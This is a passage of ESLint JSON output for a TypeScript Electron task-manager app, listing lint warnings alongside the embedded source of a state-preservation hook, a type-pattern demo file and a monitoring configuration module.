loadProjects()\n  }, [loadProjects])\n\n  return {\n    projects,\n    activeProject,\n    isConnected,\n    isLoading,\n    addProject,\n    removeProject,\n    switchToProject,\n    addProjectWithFilePicker,\n    loadProjects\n  }\n}","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/hooks/useViewStatePreservation.ts","messages":[{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":11,"column":17,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":11,"endColumn":20,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[407,410],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[407,410],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"react-hooks/exhaustive-deps","severity":1,"message":"React Hook useEffect was passed a dependency list that is not an array literal. This means we can't statically verify whether you've passed the correct dependencies.","line":18,"column":6,"nodeType":"Identifier","endLine":18,"endColumn":18},{"ruleId":"react-hooks/exhaustive-deps","severity":1,"message":"React Hook useEffect has missing dependencies: 'currentState' and 'viewName'. Either include them or remove the dependency array.","line":18,"column":6,"nodeType":"Identifier","endLine":18,"endColumn":18,"suggestions":[{"desc":"Update the dependencies array to be: [currentState, viewName]","fix":{"range":[591,603],"text":"[currentState, viewName]"}}]}],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":3,"fixableErrorCount":0,"fixableWarningCount":0,"source":"import { useEffect, useCallback } from 'react';\nimport { saveViewState, loadViewState, type ViewState } from '@/utils/statePreservation';\n\n/**\n * Custom hook for view state preservation in React components\n * Automatically saves and loads component state to survive errors and crashes\n */\nexport function useViewStatePreservation<T extends ViewState>(\n  viewName: string,\n  currentState: T,\n  dependencies: any[] = []\n) {\n  // Save state whenever dependencies change\n  useEffect(() => {\n    if (Object.keys(currentState).length > 0) {\n      saveViewState(viewName, currentState);\n    }\n  }, dependencies);\n\n  // Load saved state function\n  const loadSavedState = useCallback((): T | null => {\n    return loadViewState<T>(viewName);\n  }, [viewName]);\n\n  // Manual save function\n  const saveCurrentState = useCallback((stateToSave?: T) => {\n    const state = stateToSave || currentState;\n    return saveViewState(viewName, state);\n  }, [viewName, currentState]);\n\n  return {\n    loadSavedState,\n    saveCurrentState\n  };\n}\n\n/**\n * Example usage in a view component:\n * \n * ```typescript\n * const TaskListView = () => {\n *   const [viewState, setViewState] = useState({\n *     sortBy: 'priority',\n *     filterStatus: 'all',\n *     selectedTasks: []\n *   });\n * \n *   const { loadSavedState, saveCurrentState } = useViewStatePreservation(\n *     'taskList',\n *     viewState,\n *     [viewState] // Dependencies that trigger auto-save\n *   );\n * \n *   // Load saved state on mount\n *   useEffect(() => {\n *     const savedState = loadSavedState();\n *     if (savedState) {\n *       setViewState(prev => ({ ...prev, ...savedState }));\n *     }\n *   }, []);\n * \n *   // Manual save before risky operations\n *   const handleBulkOperation = () => {\n *     saveCurrentState(); // Backup before bulk operation\n *     // ... perform bulk operation\n *   };\n * \n *   return (\n *     // Component JSX\n *   );\n * };\n * ```\n */","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/lib/advanced-types.ts","messages":[{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":105,"column":52,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":105,"endColumn":55,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[3740,3743],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[3740,3743],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":107,"column":35,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":107,"endColumn":38,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[3832,3835],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[3832,3835],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":198,"column":56,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":198,"endColumn":59,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[6311,6314],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[6311,6314],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":244,"column":67,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":244,"endColumn":70,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[7669,7672],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[7669,7672],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]}],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":4,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * Advanced TypeScript 5.8 patterns demonstrating const contexts for template literals\n * and other cutting-edge type features for 2025\n */\n\n// Template literal types with const contexts\nexport const createStrictRoute = <T extends string>(route: T) => route;\n\n// Const context for template literals - TypeScript 5.8 enhancement\nexport type StrictRoutes = '/dashboard' | '/tasks' | '/projects' | '/settings';\n\n// Advanced template literal pattern matching\nexport type APIEndpoint<T extends string> = `api/${T}`;\nexport type TaskEndpoint<T extends string> = APIEndpoint<`tasks/${T}`>;\nexport type ProjectEndpoint<T extends string> = APIEndpoint<`projects/${T}`>;\n\n// Const assertion for API endpoints with template literals\nexport const API_ENDPOINTS = {\n  tasks: {\n    list: 'api/tasks' as const,\n    create: 'api/tasks/create' as const,\n    update: 'api/tasks/update' as const,\n    delete: 'api/tasks/delete' as const,\n  },\n  projects: {\n    list: 'api/projects' as const,\n    create: 'api/projects/create' as const,\n    update: 'api/projects/update' as const,\n    delete: 'api/projects/delete' as const,\n  }\n} as const;\n\n// Extract endpoint types from const assertion\nexport type APIEndpoints = typeof API_ENDPOINTS;\nexport type TaskEndpoints = APIEndpoints['tasks'][keyof APIEndpoints['tasks']];\nexport type ProjectEndpoints = APIEndpoints['projects'][keyof APIEndpoints['projects']];\n\n// Advanced branded types for type safety\ndeclare const __brand: unique symbol;\ntype Brand<T, U> = T & { [__brand]: U };\n\nexport type TaskId = Brand<string, 'TaskId'>;\nexport type ProjectId = Brand<string, 'ProjectId'>;\nexport type UserId = Brand<string, 'UserId'>;\nexport type Timestamp = Brand<number, 'Timestamp'>;\n\n// Template literal utility for creating type-safe CSS classes\nexport type TailwindColor = 'red' | 'blue' | 'green' | 'yellow' | 'purple' | 'pink' | 'gray';\nexport type TailwindShade = '50' | '100' | '200' | '300' | '400' | '500' | '600' | '700' | '800' | '900';\nexport type TailwindColorClass = `text-${TailwindColor}-${TailwindShade}` | `bg-${TailwindColor}-${TailwindShade}`;\n\n// Const context for theme configurations\nexport const THEME_CONFIG = {\n  colors: {\n    primary: {\n      50: '#eff6ff',\n      100: '#dbeafe',\n      500: '#3b82f6',\n      900: '#1e3a8a',\n    },\n    secondary: {\n      50: '#f8fafc',\n      100: '#f1f5f9',\n      500: '#64748b',\n      900: '#0f172a',\n    }\n  },\n  spacing: {\n    xs: '0.5rem',\n    sm: '1rem',\n    md: '1.5rem',\n    lg: '2rem',\n    xl: '3rem',\n  }\n} as const;\n\n// Extract theme types from const assertion\nexport type ThemeConfig = typeof THEME_CONFIG;\nexport type ThemeColor = keyof ThemeConfig['colors'];\nexport type ThemeShade = keyof ThemeConfig['colors']['primary'];\nexport type ThemeSpacing = keyof ThemeConfig['spacing'];\n\n// Advanced conditional types with template literals\nexport type EventName<T extends string> = `on${Capitalize<T>}`;\nexport type TaskEventName = EventName<'create' | 'update' | 'delete' | 'complete'>;\n\n// Const context for event handlers\nexport const _TASK_EVENTS = {\n  onCreate: 'onCreate' as const,\n  onUpdate: 'onUpdate' as const,\n  onDelete: 'onDelete' as const,\n  onComplete: 'onComplete' as const,\n} as const;\n\nexport type TaskEvents = typeof _TASK_EVENTS;\nexport type TaskEventKeys = keyof TaskEvents;\nexport type TaskEventValues = TaskEvents[TaskEventKeys];\n\n// Template literal types for building type-safe query selectors\nexport type CSSSelector<T extends string> = `[data-testid=\"${T}\"]` | `#${T}` | `.${T}`;\nexport type TaskSelector = CSSSelector<`task-${string}`>;\nexport type ProjectSelector = CSSSelector<`project-${string}`>;\n\n// Advanced utility type for creating type-safe form field names\nexport type FormFieldName<T extends Record<string, any>, K extends keyof T = keyof T> = \n  K extends string \n    ? T[K] extends Record<string, any>\n      ? `${K}.${FormFieldName<T[K]>}`\n      : K\n    : never;\n\n// Example usage with task form\nexport interface TaskForm {\n  title: string;\n  description: string;\n  priority: 'low' | 'medium' | 'high';\n  metadata: {\n    createdBy: string;\n    tags: string[];\n  };\n}\n\nexport type TaskFormFieldName = FormFieldName<TaskForm>;\n// Results in: \"title\" | \"description\" | \"priority\" | \"metadata.createdBy\" | \"metadata.tags\"\n\n// Const context for status configurations with template literals\nexport const STATUS_CONFIG = {\n  task: {\n    pending: { \n      label: 'Pending',\n      color: 'text-yellow-500' as TailwindColorClass,\n      icon: 'â³'\n    },\n    inProgress: { \n      label: 'In Progress',\n      color: 'text-blue-500' as TailwindColorClass,\n      icon: 'ðŸ”„'\n    },\n    completed: { \n      label: 'Completed',\n      color: 'text-green-500' as TailwindColorClass,\n      icon: 'âœ…'\n    },\n  },\n  project: {\n    active: { \n      label: 'Active',\n      color: 'text-green-600' as TailwindColorClass,\n      icon: 'ðŸš€'\n    },\n    paused: { \n      label: 'Paused',\n      color: 'text-gray-500' as TailwindColorClass,\n      icon: 'â¸ï¸'\n    },\n    archived: { \n      label: 'Archived',\n      color: 'text-gray-400' as TailwindColorClass,\n      icon: 'ðŸ“'\n    },\n  }\n} as const;\n\nexport type StatusConfig = typeof STATUS_CONFIG;\nexport type TaskStatus = keyof StatusConfig['task'];\nexport type ProjectStatus = keyof StatusConfig['project'];\n\n// Advanced pattern: Creating type-safe builders with template literals\nexport class TypeSafeQueryBuilder<T extends string = ''> {\n  constructor(private query: T = '' as T) {}\n\n  select<U extends string>(field: U): TypeSafeQueryBuilder<`${T}SELECT ${U} `> {\n    return new TypeSafeQueryBuilder(`${this.query}SELECT ${field} ` as `${T}SELECT ${U} `);\n  }\n\n  from<U extends string>(table: U): TypeSafeQueryBuilder<`${T}FROM ${U} `> {\n    return new TypeSafeQueryBuilder(`${this.query}FROM ${table} ` as `${T}FROM ${U} `);\n  }\n\n  where<U extends string>(condition: U): TypeSafeQueryBuilder<`${T}WHERE ${U} `> {\n    return new TypeSafeQueryBuilder(`${this.query}WHERE ${condition} ` as `${T}WHERE ${U} `);\n  }\n\n  build(): T {\n    return this.query;\n  }\n}\n\n// Usage example with type safety\nexport const createTaskQuery = () =>\n  new TypeSafeQueryBuilder()\n    .select('*')\n    .from('tasks')\n    .where('status = \"pending\"')\n    .build();\n\n// Type-safe configuration pattern with const contexts\nexport const _createConfig = <T extends Record<string, any>>(config: T) => config;\n\nexport const APP_CONFIG = _createConfig({\n  api: {\n    baseUrl: 'http://localhost:3001',\n    timeout: 5000,\n    retries: 3,\n  },\n  ui: {\n    animations: {\n      duration: 300,\n      easing: 'ease-in-out',\n    },\n    breakpoints: {\n      sm: '640px',\n      md: '768px',\n      lg: '1024px',\n      xl: '1280px',\n    },\n  },\n  features: {\n    darkMode: true,\n    notifications: true,\n    analytics: false,\n  }\n});\n\nexport type AppConfig = typeof APP_CONFIG;\nexport type APIConfig = AppConfig['api'];\nexport type UIConfig = AppConfig['ui'];\nexport type FeatureFlags = AppConfig['features'];\n\n// Utility functions for working with branded types\nexport const createTaskId = (id: string): TaskId => id as TaskId;\nexport const createProjectId = (id: string): ProjectId => id as ProjectId;\nexport const createUserId = (id: string): UserId => id as UserId;\nexport const createTimestamp = (timestamp: number): Timestamp => timestamp as Timestamp;\n\n// Type guard utilities\nexport const isTaskId = (value: string): value is TaskId => \n  typeof value === 'string' && value.length > 0;\n\nexport const isProjectId = (value: string): value is ProjectId => \n  typeof value === 'string' && value.length > 0;\n\n// Advanced const assertion pattern for creating immutable data structures\nexport const _createImmutableTaskData = <T extends Record<string, any>>(data: T) => {\n  return Object.freeze(data) as Readonly<T>;\n};\n\n// Example usage\nexport const _DEFAULT_TASK = _createImmutableTaskData({\n  title: '',\n  description: '',\n  priority: 'medium' as const,\n  status: 'pending' as const,\n  createdAt: Date.now(),\n  updatedAt: Date.now(),\n});\n\nexport type DefaultTask = typeof _DEFAULT_TASK;","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/lib/config/monitoring.ts","messages":[{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":159,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":159,"endColumn":20,"suggestions":[{"fix":{"range":[5293,5348],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":222,"column":5,"nodeType":"MemberExpression","messageId":"unexpected","endLine":222,"endColumn":17,"suggestions":[{"fix":{"range":[7493,7552],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":298,"column":27,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":298,"endColumn":30,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[10510,10513],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[10510,10513],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":363,"column":29,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":363,"endColumn":32,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[12501,12504],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[12501,12504],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":364,"column":39,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":364,"endColumn":42,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[12555,12558],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[12555,12558],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":365,"column":40,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":365,"endColumn":43,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[12622,12625],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[12622,12625],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":366,"column":40,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":366,"endColumn":43,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[12690,12693],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[12690,12693],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]}],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":7,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * Monitoring Configuration (2025)\n * \n * Centralized configuration for error reporting, telemetry, and monitoring services\n * with environment-specific settings and feature flags.\n * \n * Following 2025 patterns for production monitoring and observability.\n */\n\nimport type { ErrorReportingConfig } from '../services/errorReporting';\nimport type { TelemetryConfig } from '../services/telemetry';\nimport type { GlobalErrorHandlerConfig } from '../services/globalErrorHandler';\n\n// Environment detection\nexport const environment = (process.env.NODE_ENV || 'development') as 'development' | 'production' | 'test';\nexport const isProduction = environment === 'production';\nexport const isDevelopment = environment === 'development';\nexport const isTesting = environment === 'test';\n\n// Version and release information\nexport const appVersion = process.env.APP_VERSION || '0.0.0';\nexport const buildHash = process.env.BUILD_HASH || 'unknown';\nexport const releaseChannel = process.env.RELEASE_CHANNEL || 'dev';\n\n// Feature flags for monitoring\nexport interface MonitoringFeatureFlags {\n  enableErrorReporting: boolean;\n  enableTelemetry: boolean;\n  enablePerformanceMonitoring: boolean;\n  enableUserInteractionTracking: boolean;\n  enableResourceTracking: boolean;\n  enableOfflineSupport: boolean;\n  enableDebugMode: boolean;\n  enableConsoleLogging: boolean;\n  enableSessionReplay: boolean;\n  enableUserFeedback: boolean;\n}\n\n// Default feature flags based on environment\nconst getDefaultFeatureFlags = (): MonitoringFeatureFlags => ({\n  enableErrorReporting: isProduction,\n  enableTelemetry: isProduction,\n  enablePerformanceMonitoring: true,\n  enableUserInteractionTracking: isProduction,\n  enableResourceTracking: !isTesting,\n  enableOfflineSupport: true,\n  enableDebugMode: isDevelopment,\n  enableConsoleLogging: isDevelopment || isTesting,\n  enableSessionReplay: false, // Opt-in feature\n  enableUserFeedback: isProduction\n});\n\n// Monitoring service endpoints and credentials\nexport interface MonitoringEndpoints {\n  sentryDsn?: string;\n  telemetryEndpoint?: string;\n  telemetryApiKey?: string;\n  crashReportingEndpoint?: string;\n  healthCheckEndpoint?: string;\n}\n\n// Environment-specific endpoints\nconst getDefaultEndpoints = (): MonitoringEndpoints => {\n  if (isProduction) {\n    return {\n      sentryDsn: process.env.SENTRY_DSN,\n      telemetryEndpoint: process.env.TELEMETRY_ENDPOINT || 'https://api.example.com/telemetry',\n      telemetryApiKey: process.env.TELEMETRY_API_KEY,\n      crashReportingEndpoint: process.env.CRASH_REPORTING_ENDPOINT,\n      healthCheckEndpoint: process.env.HEALTH_CHECK_ENDPOINT\n    };\n  }\n  \n  if (isDevelopment) {\n    return {\n      sentryDsn: process.env.SENTRY_DSN_DEV,\n      telemetryEndpoint: process.env.TELEMETRY_ENDPOINT_DEV || 'http://localhost:8080/telemetry',\n      telemetryApiKey: process.env.TELEMETRY_API_KEY_DEV || 'dev-key',\n      crashReportingEndpoint: process.env.CRASH_REPORTING_ENDPOINT_DEV,\n      healthCheckEndpoint: process.env.HEALTH_CHECK_ENDPOINT_DEV || 'http://localhost:8080/health'\n    };\n  }\n  \n  // Test environment\n  return {\n    telemetryEndpoint: 'http://localhost:0/telemetry',\n    telemetryApiKey: 'test-key'\n  };\n};\n\n// Sample rates for different environments\nexport interface SampleRates {\n  errorReporting: number;\n  telemetry: number;\n  performanceMetrics: number;\n  userInteractions: number;\n}\n\nconst getDefaultSampleRates = (): SampleRates => ({\n  errorReporting: isProduction ? 1.0 : 0.5,\n  telemetry: isProduction ? 0.1 : 1.0,\n  performanceMetrics: isProduction ? 0.2 : 1.0,\n  userInteractions: isProduction ? 0.05 : 1.0\n});\n\n// Comprehensive monitoring configuration\nexport interface MonitoringConfig {\n  environment: string;\n  appVersion: string;\n  buildHash: string;\n  releaseChannel: string;\n  featureFlags: MonitoringFeatureFlags;\n  endpoints: MonitoringEndpoints;\n  sampleRates: SampleRates;\n  errorReporting: ErrorReportingConfig;\n  telemetry: TelemetryConfig;\n  globalErrorHandler: GlobalErrorHandlerConfig;\n}\n\n// Create environment-specific error reporting config\nconst createErrorReportingConfig = (\n  featureFlags: MonitoringFeatureFlags,\n  endpoints: MonitoringEndpoints,\n  sampleRates: SampleRates\n): ErrorReportingConfig => ({\n  enabled: featureFlags.enableErrorReporting,\n  dsn: endpoints.sentryDsn,\n  environment,\n  release: `${appVersion}-${buildHash}`,\n  sampleRate: sampleRates.errorReporting,\n  maxOfflineItems: isProduction ? 50 : 100,\n  enableLocalFallback: featureFlags.enableOfflineSupport,\n  enableSessionReplay: featureFlags.enableSessionReplay,\n  beforeSend: (errorData) => {\n    // Filter out noise in production\n    if (isProduction) {\n      // Skip chunk loading errors and other non-critical issues\n      const message = errorData.message.toLowerCase();\n      if (message.includes('loading chunk') || \n          message.includes('script error') ||\n          message.includes('non-error promise rejection')) {\n        return null;\n      }\n    }\n    \n    // Add additional context in development\n    if (isDevelopment) {\n      errorData.extra = {\n        ...errorData.extra,\n        debugMode: true,\n        buildInfo: { appVersion, buildHash, releaseChannel }\n      };\n    }\n    \n    return errorData;\n  },\n  onError: (error) => {\n    if (featureFlags.enableConsoleLogging) {\n      console.error('Error reporting service error:', error);\n    }\n  }\n});\n\n// Create environment-specific telemetry config\nconst createTelemetryConfig = (\n  featureFlags: MonitoringFeatureFlags,\n  endpoints: MonitoringEndpoints,\n  sampleRates: SampleRates\n): TelemetryConfig => ({\n  enabled: featureFlags.enableTelemetry,\n  apiKey: endpoints.telemetryApiKey,\n  endpoint: endpoints.telemetryEndpoint,\n  environment,\n  sampleRate: sampleRates.telemetry,\n  maxOfflineItems: isProduction ? 250 : 500,\n  enablePerformanceMetrics: featureFlags.enablePerformanceMonitoring,\n  enableUserInteractionTracking: featureFlags.enableUserInteractionTracking,\n  enableResourceTracking: featureFlags.enableResourceTracking,\n  sessionTimeout: 30 * 60 * 1000, // 30 minutes\n  batchSize: isProduction ? 100 : 50,\n  flushInterval: isProduction ? 30000 : 10000 // 30s prod, 10s dev\n});\n\n// Create environment-specific global error handler config\nconst createGlobalErrorHandlerConfig = (\n  featureFlags: MonitoringFeatureFlags\n): GlobalErrorHandlerConfig => ({\n  enabled: true, // Always enabled for basic error capture\n  reportToConsole: featureFlags.enableConsoleLogging,\n  preventDefaultHandling: false,\n  enableTelemetryIntegration: featureFlags.enableTelemetry,\n  enablePerformanceMonitoring: featureFlags.enablePerformanceMonitoring,\n  errorThreshold: isProduction ? 100 : 50,\n  errorTimeWindow: 60000, // 1 minute\n  enableUserFeedback: featureFlags.enableUserFeedback\n});\n\n// User-configurable settings (can be overridden)\nexport interface UserMonitoringSettings {\n  enableErrorReporting?: boolean;\n  enableTelemetry?: boolean;\n  enablePerformanceMonitoring?: boolean;\n  enableUserFeedback?: boolean;\n  debugMode?: boolean;\n}\n\n// Load user settings from localStorage\nconst getUserSettings = (): UserMonitoringSettings => {\n  try {\n    const stored = localStorage.getItem('taskmaster_monitoring_settings');\n    return stored ? JSON.parse(stored) : {};\n  } catch {\n    return {};\n  }\n};\n\n// Save user settings to localStorage\nexport const saveUserSettings = (settings: UserMonitoringSettings): void => {\n  try {\n    localStorage.setItem('taskmaster_monitoring_settings', JSON.stringify(settings));\n  } catch (error) {\n    console.warn('Failed to save monitoring settings:', error);\n  }\n};\n\n// Apply user settings to feature flags\nconst applyUserSettings = (\n  defaultFlags: MonitoringFeatureFlags,\n  userSettings: UserMonitoringSettings\n): MonitoringFeatureFlags => ({\n  ...defaultFlags,\n  enableErrorReporting: userSettings.enableErrorReporting ?? defaultFlags.enableErrorReporting,\n  enableTelemetry: userSettings.enableTelemetry ?? defaultFlags.enableTelemetry,\n  enablePerformanceMonitoring: userSettings.enablePerformanceMonitoring ?? defaultFlags.enablePerformanceMonitoring,\n  enableUserFeedback: userSettings.enableUserFeedback ?? defaultFlags.enableUserFeedback,\n  enableDebugMode: userSettings.debugMode ?? defaultFlags.enableDebugMode,\n  enableConsoleLogging: userSettings.debugMode ?? defaultFlags.enableConsoleLogging\n});\n\n// Create the complete monitoring configuration\nexport const createMonitoringConfig = (userOverrides: UserMonitoringSettings = {}): MonitoringConfig => {\n  const endpoints = getDefaultEndpoints();\n  const sampleRates = getDefaultSampleRates();\n  const defaultFeatureFlags = getDefaultFeatureFlags();\n  const userSettings = getUserSettings();\n  const featureFlags = applyUserSettings(defaultFeatureFlags, { ...userSettings, ...userOverrides });\n\n  return {\n    environment,\n    appVersion,\n    buildHash,\n    releaseChannel,\n    featureFlags,\n    endpoints,\n    sampleRates,\n    errorReporting: createErrorReportingConfig(featureFlags, endpoints, sampleRates),\n    telemetry: createTelemetryConfig(featureFlags, endpoints, sampleRates),\n    globalErrorHandler: createGlobalErrorHandlerConfig(featureFlags)\n  };\n};\n\n// Default monitoring configuration\nexport const defaultMonitoringConfig = createMonitoringConfig();\n\n// Configuration validation\nexport const validateMonitoringConfig = (config: MonitoringConfig): string[] => {\n  const errors: string[] = [];\n\n  // Validate error reporting\n  if (config.featureFlags.enableErrorReporting && !config.endpoints.sentryDsn && isProduction) {\n    errors.push('Error reporting is enabled but no Sentry DSN is configured for production');\n  }\n\n  // Validate telemetry\n  if (config.featureFlags.enableTelemetry && !config.endpoints.telemetryApiKey && isProduction) {\n    errors.push('Telemetry is enabled but no API key is configured for production');\n  }\n\n  // Validate sample rates\n  if (config.sampleRates.errorReporting < 0 || config.sampleRates.errorReporting > 1) {\n    errors.push('Error reporting sample rate must be between 0 and 1');\n  }\n\n  if (config.sampleRates.telemetry < 0 || config.sampleRates.telemetry > 1) {\n    errors.push('Telemetry sample rate must be between 0 and 1');\n  }\n\n  return errors;\n};\n\n// Health check for monitoring services\nexport interface MonitoringHealthStatus {\n  errorReporting: 'healthy' | 'degraded' | 'unhealthy';\n  telemetry: 'healthy' | 'degraded' | 'unhealthy';\n  globalErrorHandler: 'healthy' | 'degraded' | 'unhealthy';\n  overall: 'healthy' | 'degraded' | 'unhealthy';\n  lastChecked: Date;\n  details: Record<string, any>;\n}\n\nexport const checkMonitoringHealth = async (config: MonitoringConfig): Promise<MonitoringHealthStatus> => {\n  const status: MonitoringHealthStatus = {\n    errorReporting: 'healthy',\n    telemetry: 'healthy',\n    globalErrorHandler: 'healthy',\n    overall: 'healthy',\n    lastChecked: new Date(),\n    details: {}\n  };\n\n  try {\n    // Check error reporting service\n    if (config.featureFlags.enableErrorReporting && config.endpoints.sentryDsn) {\n      // Simulate health check - in real implementation, this would ping the service\n      status.details.errorReporting = { configured: true, endpoint: config.endpoints.sentryDsn };\n    }\n\n    // Check telemetry service\n    if (config.featureFlags.enableTelemetry && config.endpoints.telemetryEndpoint) {\n      try {\n        if (config.endpoints.healthCheckEndpoint && navigator.onLine) {\n          // Simulate health check\n          status.details.telemetry = { configured: true, endpoint: config.endpoints.telemetryEndpoint };\n        }\n      } catch (error) {\n        status.telemetry = 'degraded';\n        status.details.telemetryError = error;\n      }\n    }\n\n    // Check global error handler\n    status.details.globalErrorHandler = { enabled: config.globalErrorHandler.enabled };\n\n    // Determine overall status\n    const statuses = [status.errorReporting, status.telemetry, status.globalErrorHandler];\n    if (statuses.some(s => s === 'unhealthy')) {\n      status.overall = 'unhealthy';\n    } else if (statuses.some(s => s === 'degraded')) {\n      status.overall = 'degraded';\n    }\n\n  } catch (error) {\n    status.overall = 'unhealthy';\n    status.details.healthCheckError = error;\n  }\n\n  return status;\n};\n\n// Debug utilities\nexport const getMonitoringDebugInfo = () => ({\n  environment,\n  isProduction,\n  isDevelopment,\n  isTesting,\n  appVersion,\n  buildHash,\n  releaseChannel,\n  userAgent: navigator.userAgent,\n  url: window.location.href,\n  timestamp: new Date().toISOString(),\n  performance: {\n    memory: (performance as any).memory ? {\n      usedJSHeapSize: (performance as any).memory.usedJSHeapSize,\n      totalJSHeapSize: (performance as any).memory.totalJSHeapSize,\n      jsHeapSizeLimit: (performance as any).memory.jsHeapSizeLimit\n    } : null,\n    timing: performance.timing ? {\n      loadComplete: performance.timing.loadEventEnd - performance.timing.navigationStart,\n      domReady: performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart\n    } : null\n  }\n});\n\n// Export utility functions\nexport {\n  getUserSettings,\n  applyUserSettings,\n  createErrorReportingConfig,\n  createTelemetryConfig,\n  createGlobalErrorHandlerConfig\n};\n\n// Types are already exported with their declarations","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/lib/config/performance-dashboard.ts","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/lib/ipc.ts","messages":[{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":11,"column":34,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":11,"endColumn":37,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[390,393],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[390,393],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different 